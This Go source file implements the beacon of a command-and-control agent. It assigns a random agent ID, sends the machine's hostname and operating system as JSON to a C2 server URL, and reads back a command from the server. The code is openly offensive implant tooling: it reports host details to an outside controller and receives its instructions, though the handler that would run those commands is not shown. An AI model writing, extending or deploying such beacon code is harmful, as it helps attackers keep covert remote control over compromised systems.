package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"runtime"
	"time"
)

type AgentData struct {
	ID       string `json:"id"`
	Hostname string `json:"hostname"`
	OS       string `json:"os"`
	Status   string `json:"status"`
}

type C2Response struct {
	Status  string `json:"status"`
	Command string `json:"command"`
}

var AgentID string

func init() {
	AgentID = fmt.Sprintf("agent-%s", randString(6))
}

func SendBeacon(c2Url string, status string) (*C2Response, error) {
	hostname, _ := os.Hostname()

	data := AgentData{
		ID:       AgentID,
		Hostname: hostname,
		OS:       runtime.GOOS,
		Status:   status,
	}

	payload, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}

	// 2s timeout
	client := http.Client{Timeout: 2 * time.Second}
	resp, err := client.Post(c2Url, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var c2Resp C2Response
	if err := json.NewDecoder(resp.Body).Decode(&c2Resp); err != nil {
		return nil, err
	}

	return &c2Resp, nil
}
